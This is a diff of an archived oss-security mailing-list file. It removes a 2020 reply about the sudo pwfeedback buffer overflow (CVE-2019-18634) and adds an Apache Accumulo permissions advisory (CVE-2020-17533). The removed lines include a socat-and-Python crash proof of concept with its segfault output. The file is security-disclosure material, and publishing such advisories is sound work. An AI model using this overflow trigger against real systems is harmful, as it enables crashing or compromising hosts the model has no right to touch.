@@ -1,55 +1,27 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/02/05/2
-Message-ID: <CAPWJUny2yaenu_Kg7s4VhuL0nZ4Yg4XPN9HN75e5w0MU4brTnw@mail.gmail.com>
-Date: Wed, 5 Feb 2020 22:34:53 +1100
-From: William Bowling <will@...wling.info>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/12/29/1
+Message-ID: <CAF1jEfCZoRW_tJNgz9+X7THYd1Jb2N30MJnGMKk1kv=HK03HBw@mail.gmail.com>
+Date: Mon, 28 Dec 2020 23:05:36 -0500
+From: Billie Rinaldi <billie@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled
+Subject: CVE-2020-17533: Apache Accumulo Improper Handling of Insufficient Permissions
 Content-Type: text/plain; charset=utf-8
 
-When using a pty, sudo_term_eof and sudo_term_kill are initialized to 0x4
-and 0x15 allowing the overflow to be reached, making 1.8.26-1.8.30 also
-vulnerable:
+Description:
 
-$ socat pty,link=/tmp/pty,waitslave exec:"python -c
-'print((\"A\"*100+chr(0x15))*50)'" &
-$ sudo -S id < /tmp/pty
-[sudo] password for user1: Segmentation fault
-$ sudo -V
-Sudo version 1.8.30
-Sudoers policy plugin version 1.8.30
-Sudoers file grammar version 46
-Sudoers I/O plugin version 1.8.30
+Apache Accumulo versions 1.5.0 through 1.10.0 and version 2.0.0 do not
+properly check the return value of some policy enforcement functions
+before permitting an authenticated user to perform certain administrative
+operations. Specifically, the return values of the 'canFlush' and
+'canPerformSystemActions' security functions are not checked in some
+instances, therefore allowing an authenticated user with insufficient
+permissions to perform the following actions: flushing a table, shutting
+down Accumulo or an individual tablet server, and setting or removing
+system-wide Accumulo configuration properties.
 
-- Will
+This issue is being tracked as https://github.com/apache/accumulo/pull/1828
 
-On Sat, Feb 1, 2020 at 12:59 AM Todd C. Miller <Todd.Miller@...o.ws> wrote:
+Mitigation:
 
-> On Thu, 30 Jan 2020 11:23:28 -0700, "Todd C. Miller" wrote:
->
-> > Sudo versions affected:
-> >
-> > Sudo versions 1.7.1 to 1.8.30 inclusive are affected but only if
-> > the "pwfeedback" option is enabled in sudoers.
->
-> It turns out a change in EOF handling introduced in sudo 1.8.26
-> prevents exploitation of the bug.  The EOF character is also
-> initialized to 0 and sudo 1.8.26 checks for EOF before it checks
-> for the kill character.
->
-> This means that the bug actually affects sudo versions 1.7.1 to
-> 1.8.25p1 inclusive.
->
-> Sorry for the oversight.  I've updated the affected versions in
-> https://www.sudo.ws/alerts/pwfeedback.html
->
->  - todd
->
-
-
--- 
-
-GPG Key ID: 0x980F711A
-
-GPG Key Fingerprint: AA38 2A0E 7D22 18A9 6086  0289 41DC E04B 980F 711A
+Upgrade to Apache Accumulo version 1.10.1, 2.0.1, or later.
 
